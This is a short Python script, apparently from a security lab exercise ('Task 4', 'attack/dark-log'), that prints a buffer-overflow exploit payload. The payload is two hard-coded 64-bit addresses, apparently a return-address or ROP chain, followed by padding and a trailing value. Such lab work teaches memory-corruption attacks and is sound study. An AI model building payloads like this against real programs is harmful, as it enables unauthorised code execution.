#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
payload = b'\x58\x00\x40\x00\x00\x00\x00\x00'
payload += b'\x91\x16\x40\x00\x00\x00\x00\x00'
payload += b'A' * 112
payload += b'B' * 128
payload += b'\xa0\x00\x00\x00'

sys.stdout.buffer.write(payload)
